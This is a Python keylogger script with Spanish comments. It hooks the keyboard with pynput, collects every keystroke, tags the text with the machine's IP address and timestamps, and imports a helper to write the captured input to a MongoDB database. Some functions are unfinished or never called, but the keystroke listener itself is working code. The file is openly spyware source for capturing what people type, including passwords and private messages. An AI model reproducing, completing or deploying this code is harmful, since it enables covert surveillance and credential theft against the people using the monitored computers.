import threading
from mongobd import conexion
import pynput.keyboard
import socket
import time
import sys
from datetime import datetime


lista_tecla=[] #En esta lista se guardaran las palabras

def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final):
    mongo_conexion = conexion()
    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final)

def imprimir():
    tecla = ''.join(lista_tecla)
    #2.SEGUNDO PASO
    return tecla

def presiona(key):
    key1 = convertir(key)
    #Key es con la letra k en mayuscula
    if key1 == "Key.esc":
        print("Saliendo...")
        #imprimir()#imprime en el documento txt
        #extrar_informacion()
        #sys.exit()
        raise
        #liste.stop()
    #Si es igual al espacio
    elif key1 == "Key.space":
        lista_tecla.append(" ")
    #si le da un enter
    elif key1 == "Key.enter":
        lista_tecla.append("\n")
    #Si borra que no aparesca nada
    elif key1 == "Key.backspace":
        lista_tecla.append(" borro ")
    #Si es igual a una letra
    else:
        lista_tecla.append(key1)

def convertir(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def extrar_informacion():
    #Guarda la ip del equipo
    equipo=socket.gethostbyname(socket.gethostname())
    fecha_hora=""
    informacion=""
    fecha_hora_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S'+"\n")
    contador = 0
    with open("log.txt", "r") as archivo:
        for linea in archivo:
            if contador == 0:
                fecha_hora = linea
            else:
                informacion = informacion + linea
            contador = contador+1

def ciclo_ejecucion():
    while True:
        time.sleep(10)
        #1.PRIMER PASO
        ip_equipo = socket.gethostbyname(socket.gethostname())
        tiempo_inicial = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        lo_escrito = imprimir()
        tiempo_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(ip_equipo+"\n"+tiempo_inicial+"\n"+tiempo_final+"\n"+lo_escrito)
        lista_tecla.clear()



with pynput.keyboard.Listener(on_press=presiona) as liste:
    liste.join()


